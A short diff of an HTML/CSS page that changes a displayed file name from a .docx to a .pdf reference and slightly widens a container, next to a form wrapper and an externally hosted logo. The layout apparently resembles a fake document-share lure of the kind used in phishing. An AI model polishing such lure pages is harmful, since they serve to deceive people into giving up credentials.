@@ -25,7 +25,7 @@
         <div class="content">
           <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30" />
           
-          <p style="font-size: 17px;  color: #333333;">FA65478-06-17-2025.docx</p>
+          <p style="font-size: 17px;  color: #333333;">FileRef-FAC65478_2025.pdf</p>
          
 
           <div class="form-wrapper">
@@ -202,7 +202,7 @@ body {
 }
 
 .toto-container {
-  width: 30%;
+  width: 33%;
   max-width: 350px;
   background: #fff;
   border-radius: 6px;
